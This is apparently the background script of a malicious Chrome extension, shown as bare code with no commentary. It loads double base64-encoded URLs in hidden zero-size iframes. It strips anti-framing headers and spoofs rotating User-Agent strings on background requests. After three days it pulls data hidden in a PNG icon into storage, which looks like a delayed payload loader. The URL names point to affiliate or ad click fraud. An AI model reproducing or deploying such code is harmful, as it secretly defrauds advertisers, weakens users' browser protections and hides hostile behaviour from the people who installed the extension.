window.onbeforeunload = function() {
    chrome.runtime.reload()
};

function MathRand(a, b) {
    return Math.floor(Math.random() * (b - a)) + a
}
var dt = "141054181128",
    curIfrId = "";

function ZrEpMeIfr(a, b) {
    if ("" != a) {
        var c = document.createElement("iframe"),
            d = btoa(a + MathRand(0, 18888).toString());
        c.setAttribute("display", "none");
        c.setAttribute("width", "0px");
        c.setAttribute("height", "0px");
        c.setAttribute("id", d);
        c.setAttribute("src", a);
        document.body.appendChild(c);
        curIfrId = d;
        setTimeout(function() {
            var a = document.getElementById(d);
            a.parentNode.removeChild(a)
        }, 1E3 * b)
    }
}

chrome.runtime.onMessage.addListener(function(a, b, c) {
    if (a.refererUrl) {
        var d = atob(atob(a.refererUrl));
        ZrEpMeIfr(d, 20);
        c({
            done: "ok"
        })
    }
    a.mercUrl && (d = atob(atob(a.mercUrl)), setTimeout(function() {
        document.getElementById(curIfrId).src = d
    }, 1E3))
});

chrome.webRequest.onHeadersReceived.addListener(function(a) {
    try {
        if (-1 == a.tabId) {
            for (var b = a.responseHeaders, c = b.length - 1; 0 <= c; --c) {
                var d = b[c].name.toLowerCase();
                "x-frame-options" != d && "frame-options" != d || b.splice(c, 1)
            }
            return {
                responseHeaders: b
            }
        }
    } catch (e) {}
}, {
    urls: ["<all_urls>"],
    types: ["sub_frame"]
}, ["blocking", "responseHeaders"]);

var ZrEpMeUa = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36{Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36{Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1{Mozilla/5.0 (Linux; Android 9; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36{Mozilla/5.0 (Linux; Android 9; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36{Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/70.0.3538.75 Mobile/15E148 Safari/604.1{Mozilla/5.0 (iPad; CPU OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1{Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36{Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36{Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36{Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36{Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0{Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1{Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36{Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0{Mozilla/5.0 (iPad; CPU OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.1 Safari/605.1.15{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36{Mozilla/5.0 (iPad; CPU OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1{Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36{Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/56.0.3051.99{Mozilla/5.0 (Linux; Android 8.1.0; CLT-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36{Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1{Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36".split("{"),
    localUA =
    ZrEpMeUa[Math.floor(Math.random() * ZrEpMeUa.length)],
    requestFilter = {
        urls: ["<all_urls>"]
    },
    extraInfoSpec = ["requestHeaders", "blocking"],
    handler = function(a) {
        try {
            if (-1 == a.tabId) {
                var b = a.requestHeaders;
                a = {};
                for (var c = 0, d = b.length; c < d; ++c)
                    if ("User-Agent" == b[c].name) {
                        localUA = localUA.split("~")[0].trim();
                        b[c].value = localUA;
                        break
                    } b.push({
                    name: "Redver",
                    value: "1.0"
                });
                a.requestHeaders = b;
                return a
            }
        } catch (e) {}
    };

chrome.webRequest.onBeforeSendHeaders.addListener(handler, requestFilter, extraInfoSpec);

function pull2loc() {
    var a = chrome.extension.getURL("icons/ffyrzq.png"),
        b = new XMLHttpRequest;
    b.onreadystatechange = function(a) {
        this.readyState === XMLHttpRequest.DONE && 200 === this.status && (a = {}, a.ffyrzq = this.responseText.substring(8), chrome.storage.local.set(a))
    };
    b.open("GET", a, !0);
    b.send(null)
}(function() {
    chrome.storage.local.get(null, function(a) {
        a = a.InsDt6;
        3 < ((new Date).getTime() - a) / 36E5 / 24 && pull2loc()
    })
})();